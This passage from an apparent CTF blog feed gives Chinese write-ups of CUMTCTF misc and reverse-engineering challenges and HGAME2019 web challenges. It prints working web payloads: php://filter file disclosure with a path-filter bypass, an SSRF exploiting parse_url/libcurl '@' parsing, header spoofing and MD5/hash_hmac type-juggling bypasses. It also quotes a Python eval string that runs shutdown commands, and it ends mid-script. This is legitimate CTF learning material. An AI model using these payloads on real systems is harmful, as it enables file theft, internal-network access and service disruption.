class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;355c1fb44b58ad7c38d88b5ba4f095b0&#125;</span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="misc签到"><a href="#misc签到" class="headerlink" title="misc签到"></a>misc签到</h2><p>解压之后给出了5个图片文件:</p><p><img src="https://i.loli.net/2019/01/29/5c4fc4c6822ca.png" alt=""></p><p>文件夹名是braille，想到了盲文，搜索盲文对照表</p><p><img src="https://i.loli.net/2019/01/29/5c4fc69264c59.png" alt=""></p><p>根据解压文件夹的提示可以对照出flag是B1ind。</p><h2 id="base全家桶了解一下"><a href="#base全家桶了解一下" class="headerlink" title="base全家桶了解一下??"></a>base全家桶了解一下??</h2><p>应该就是base编码的转换，尝试一下不同的base编码即可</p><p>第一层base64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GY3DMQZWGE3DON2CGU3TMNJWIM3DGMZQGZCDMNJVIY3TIMZQGMYDKRRWGM3TKNSEG42DMMZXGQ3DMN2E</span><br></pre></td></tr></table></figure><p>第二层base32</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666C61677B57656C63306D655F7430305F63756D746374667D</span><br></pre></td></tr></table></figure><p>第三层base16</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Welc0me_t00_cumtctf&#125;</span><br></pre></td></tr></table></figure><h2 id="BXS图标真好看"><a href="#BXS图标真好看" class="headerlink" title="BXS图标真好看"></a>BXS图标真好看</h2><p>记事本打开发现是一个二进制文件，file命令查看一下文件类型</p><blockquote><p>BXS.txt: PNG image data, 495 x 422, 8-bit/color RGBA, non-interlaced</p></blockquote><p>修改后缀为png，看到一串文字<code>fgoo kwnl{_u n_gaDy_ 0p}</code>，提示古典加密，猜测是栅栏密码，因为字符串长度是21，所以应该分三栏</p><p><img src="https://i.loli.net/2019/01/25/5c4a720c0a5e5.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Do_you_kn0w_png&#125;</span><br></pre></td></tr></table></figure><h2 id="矿大校歌认真听听吧？"><a href="#矿大校歌认真听听吧？" class="headerlink" title="矿大校歌认真听听吧？"></a>矿大校歌认真听听吧？</h2><p>下载zip压缩包，解压后需要密码，在16进制编辑器文件尾部看到<code>cumtctf2019</code>，解压即可得到一个mp3文件，音频也没有什么异常，应该是mp3隐写了<a href="https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2</a>，运行尝试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode.exe -X -P cumtctf2019 cumt.mp3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cumtctf_1s_v3ry_g00d!&#125;</span><br></pre></td></tr></table></figure><h2 id="起床改error啦！"><a href="#起床改error啦！" class="headerlink" title="起床改error啦！"></a>起床改error啦！</h2><p>binwalk查看图片发现存在zip压缩包，提取一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk 2333.png</span><br><span class="line">foremost 2333.png</span><br></pre></td></tr></table></figure><p>解压压缩包可以得到一个doc文件，在选项中查看隐藏文字即可看到flag</p><p><img src="https://i.loli.net/2019/01/27/5c4d21fd3ea8c.png" alt=""></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="逆向签到"><a href="#逆向签到" class="headerlink" title="逆向签到"></a>逆向签到</h2><p>直接丢进IDA查看，查看伪代码：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1b9f3be88.png" alt=""></p><p>可以看到这些变量占用了4个字节来存储。</p><p><img src="https://i.loli.net/2019/01/28/5c4f1ade58965.png" alt=""></p><p>这里的v35是100以内的任何数，也就是说可以通过爆破的方式来求得v35的值。</p><p><img src="https://i.loli.net/2019/01/28/5c4f1c7412770.png" alt=""></p><p>查看check函数，s里面的数字应该和从v5开始，地址每加上4LL的值相等。也就是说在29位的flag里面，每一位的值和v5-v34相等。所以写一个简单的脚本即可爆破出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">v5 = [<span class="number">53</span>,<span class="number">63</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">40</span>,<span class="number">1</span>,<span class="number">50</span>,<span class="number">61</span>,<span class="number">55</span>,<span class="number">99</span>,<span class="number">62</span>,<span class="number">118</span>,<span class="number">98</span>,<span class="number">60</span>,<span class="number">60</span>,<span class="number">12</span>,<span class="number">106</span>,<span class="number">58</span>,<span class="number">37</span>,<span class="number">54</span>,<span class="number">12</span>,<span class="number">38</span>,<span class="number">12</span>,<span class="number">102</span>,<span class="number">48</span>,<span class="number">60</span>,<span class="number">33</span>,<span class="number">54</span>,<span class="number">46</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">29</span>):</span><br><span class="line">        res += chr(v5[j]^i)</span><br><span class="line">    <span class="keyword">print</span> res</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1a3be6535.png" alt=""></p><h2 id="Eazy-Math"><a href="#Eazy-Math" class="headerlink" title="Eazy_Math"></a>Eazy_Math</h2><p>同样的，还是丢进IDA中查看伪代码：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1a6c49e42.png" alt=""></p><p>flag有9位，在经过String2Int和Change两个函数的变换后，如果check成功，即可成功。</p><p>首先查看String2Int函数：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1be73b91e.png" alt="img"></p><p>这个函数的作用就是将s里面的字符内容转换成int型的数值存储在v14-v18中。</p><p>查看Check函数后，可以轻易看出check的内容就是将变换后的9位与v2-v10相比较。</p><p>最后是Change函数：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1ab4dec43.png" alt=""></p><p>第一个双层循环将a3里面的数值置为0，也就是v4里面的值。第二个三重循环可以拆开来看。前两个变量i和j总共循环9次，代表着算出v4里面的数值。最后一个循环变量m则是计算的过程。这里不妨设9个未知数A,B,C,D,E,F,G,H,I。经过推算，3*k+m 是每次取三个连续的数，3*m+1是每次取0，3，6或1，4，7或2，5，8。这里代表着取v5-v13里面的数值。分析之后可以列出三个方程组：</p><script type="math/tex; mode=display">\begin{cases}A+2B+C=274\\2A+B+C=294\\A+B+2C=316\end{cases}</script><script type="math/tex; mode=display">\begin{cases}D+2E+F=262 \\2D+E+F=274 \\D+E+2F=252 \\\end{cases}</script><script type="math/tex; mode=display">\begin{cases}G+2H+I=380 \\2G+H+I=421 \\G+H+2I=427 \\\end{cases}</script><p>简单的方程组求得A-G的9个值转化为字符即为flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本次题目比较简单，有幸ak了web，可惜还是没进前三，二进制和pwn做的太差了，区块链也没做出来，要是做出来就前三了，有时间还是要学习一下区块链。&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>HGAME2019-Web-Week1&amp;2</title>
    <link href="http://chaosec.top/2019/01/30/hgame2019/"/>
    <id>http://chaosec.top/2019/01/30/hgame2019/</id>
    <published>2019-01-30T07:15:00.000Z</published>
    <updated>2019-02-12T05:04:28.094Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做</p><a id="more"></a><h1 id="week-1"><a href="#week-1" class="headerlink" title="week-1"></a>week-1</h1><h2 id="谁吃了我的flag"><a href="#谁吃了我的flag" class="headerlink" title="谁吃了我的flag"></a>谁吃了我的flag</h2><p>vim文件泄露<code>.index.html.swp</code>，vim恢复即可得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3eek_diScl0Sure_fRom+wEbsit@&#125;</span><br></pre></td></tr></table></figure></p><h2 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h2><p>url二次编码绕过 <code>?id=%2576%2569%2564%2561%2572</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;urlDecode_Is_GoOd&#125;</span><br></pre></td></tr></table></figure></p><h2 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h2><p>题目要求POST传值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://120.78.184.111:8080/week1/how/index.php --data &quot;want=12&quot;</span><br></pre></td></tr></table></figure><p>得到回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br/&gt;https://www.wikiwand.com/en/X-Forwarded-For&lt;br/&gt;only localhost can get flag</span><br></pre></td></tr></table></figure><p>依次按照要求设置请求头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://120.78.184.111:8080/week1/how/index.php --data &quot;want=12&quot; -H &quot;x-forwarded-for:127.0.0.1&quot; -A &quot;User-Agent:Waterfox/50.0&quot; -e www.bilibili.com</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;hTTp_HeaDeR_iS_Ez&#125;</span><br></pre></td></tr></table></figure><h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><p>查看源代码可知存在f12.php界面，在响应头中可以看到密码 <code>woyaoflag</code>，提交即会出现<code>cilck me to get flag</code>，点击则跳转到 <code>toofast.php</code>，回显<code>aoh,your speed is sososo fast,the flag must have been left in somewhere</code>，应该是出现了302跳转，抓包即可得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;f12_1s_aMazIng111&#125;</span><br></pre></td></tr></table></figure><h1 id="week-2"><a href="#week-2" class="headerlink" title="week-2"></a>week-2</h1><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p>探测目录发现robots.txt下存在文件<code>img/index.php</code>，访问之，得到PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $img = $_GET[<span class="string">'img'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">'1'</span>;</span><br><span class="line">    $img = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $img);</span><br><span class="line">    <span class="keyword">include_once</span>($img.<span class="string">".php"</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>题目过滤了<code>../</code>，且将其转换为空字符串，所以我们可以用<code>..././</code>来绕过，本来试了 <code>..././flag</code>，可是打不出flag，最终尝试了filter协议，原因在于include语句会将代码当做php代码执行，而转成base64编码之后则由于没有php前缀而无法被当成php代码从而将文本打印出来</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.25.25:9999/easyphp/img/index.php?img=php://filter/read=convert.base64-encode/resource=..././flag</span><br></pre></td></tr></table></figure><p>base64解码即可得到flag，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;You_4re_So_g0od&#125;</span><br></pre></td></tr></table></figure><h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (string)@$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = (string)@$_GET[<span class="string">'str2'</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">'H_game'</span>];</span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((string)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 8 fial'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 11 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个点md5绕过，第二个点是数组绕过，php数组在比较是比任何数字都大，payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.3.214:3001?str1=240610708&amp;str2=QNKCDZO&amp;str3[]=a&amp;str4[]=b&amp;H%5fgame[]=5&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php</span><br></pre></td></tr></table></figure><p>用两个@的原因可以参考这篇文章<a href="https://xz.aliyun.com/t/2215#toc-15" target="_blank" rel="noopener">ref</a></p><ul><li>当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对user@eval.com:80@baidu.com </li><li>进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过<br>此外对于evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com</li></ul><p>可以得到admin.php页面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'only localhost can see it'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]??<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>查看代码可知存在flag.php页面，关键代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当filename是flag.php（即文件存在时），又无法读取到文件，此时可以利用file_get_contents支持多种协议来读取到文件，可以使用php://filter协议，最终payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.3.214:3001?str1=240610708&amp;str2=QNKCDZO&amp;str3[]=a&amp;str4[]=b&amp;H%5fgame[]=5&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $flag = hgame&#123;ThEr4_Ar4_s0m4_Php_Tr1cks&#125; ?&gt;</span><br></pre></td></tr></table></figure><h2 id="PHP-Is-The-Best-Language"><a href="#PHP-Is-The-Best-Language" class="headerlink" title="PHP Is The Best Language"></a>PHP Is The Best Language</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'secret.php'</span>;</span><br><span class="line"><span class="comment">#echo $flag;</span></span><br><span class="line"><span class="comment">#echo $secret;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'gate'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);</span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);</span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计题目，核心代码在于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);</span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);</span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们无法控制$secret变量，自然无法计算出对应的哈希值，那么有没有那种带加密输入（door）的哈希与secret值无关呢？在PHP里面这个是存在的，就是<strong>数组(Array)</strong>，由于数组是hash_hmac无法处理的输入类型，所以会返回<strong>null</strong></p><p>第二处在于<code>(md5($_POST[&#39;key&#39;])+1) == (md5(md5($_POST[&#39;key&#39;])))+1</code></p><p>此处我们可以爆破</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;<span class="number">9999999999</span>;$i++)&#123;</span><br><span class="line"><span class="keyword">if</span> ((md5($i)+<span class="number">1</span>) == (md5(md5($i)))+<span class="number">1</span>) &#123; </span><br><span class="line"><span class="keyword">echo</span> $i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果为12</p><p>最终payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">door[]=12&amp;key=12&amp;gate=4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf</span><br></pre></td></tr></table></figure><p>flag如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Php_MayBe_Not_Safe&#125;</span><br></pre></td></tr></table></figure><h2 id="Baby-Spider"><a href="#Baby-Spider" class="headerlink" title="Baby_Spider"></a>Baby_Spider</h2><p>题目考察我们的爬虫能力，真的做的我胃疼</p><p>题目一共30关，40秒内答对30关的数学题即可获得flag</p><ul><li>1-10<br>需要用token先登录一下，注意要带上UA头，如果不带的话到第十关算式就会变成<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lambda __g: [(os.system(&apos;shutdown -s -t 0&apos;), (os.system(&apos;shutdown now&apos;), None)[1])[1] for __g[&apos;os&apos;] in [(__import__(&apos;os&apos;, __g, __g))]][0])(globals())#-----=?</span><br></pre></td></tr></table></figure></li></ul><p>由eval函数执行之后直接就关机了（这反爬虫机制真的是骚~~）</p><ul><li>11-20<br>第十一关开始题目就变了，居然修改了css字体，抓取一下css文件如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">      font-family: Ariali;</span><br><span class="line">      src: url(&apos;/static/Ariali.otf&apos;);</span><br><span class="line">      font-weight: normal;</span><br><span class="line">      font-style: normal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>下载字体<br><img src="https://i.loli.net/2019/02/11/5c614ba6c3e49.png" alt=""><br>可以看到数字对应规则变化了，对应置换一下即可</p><ul><li>21-30<br>此关开始之后，隐藏了真实的数学表达式位置，如果按照题目的计算答案是错的，结果是在css中的after元素下找到了算式，获取之后计算即可</li></ul><p>最终paylaod如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">token = <span class="string">"KxvEiiWBm41Xe6PTlKS3DnR4vsnfFcXL"</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0'</span>&#125;</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">"http://111.231.140.29:10000"</span></span><br><span class="line">url2 = <span class="string">"http://111.231.140.29:10000/question"</span></span><br><span class="line">url3 = <span 